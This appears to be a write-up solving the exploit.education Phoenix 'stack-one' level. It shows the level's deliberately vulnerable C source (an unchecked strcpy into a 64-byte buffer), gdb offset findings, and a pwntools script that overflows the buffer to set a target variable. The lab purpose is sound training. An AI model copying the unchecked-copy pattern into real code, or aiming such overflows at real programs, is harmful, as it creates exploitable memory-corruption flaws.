```c
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  if (argc < 2) {
    errx(1, "specify an argument, to be copied into the \"buffer\"");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, argv[1]);

  if (locals.changeme == 0x496c5962) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n",
        locals.changeme);
  }

  exit(0);
}
```

This code uses **strcpy** function which is dangerous because the source size could be more than destination size.

The only difference from this level and the previous one is that it requires **changeme** to be set to a specific value **0x496c5962**.

Now we can use gdb:

```
$ gdb -q /opt/phoenix/amd64/stack-one

```

We can see that  **buffer** is at **rbp-0x50** (main+69) and **changeme** is at **rbp-0x10** (main+51) so we need 64 characters to fill this gap then we can overwrite **changeme** value.

# Solution:

```python
# solve.py

from pwn import *

buff = ""
buff += 'A'*64
buff += p64(0x496c5962)

print(buff)
```

```
$ /opt/phoenix/amd64/stack-one $(python solve.py)
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```
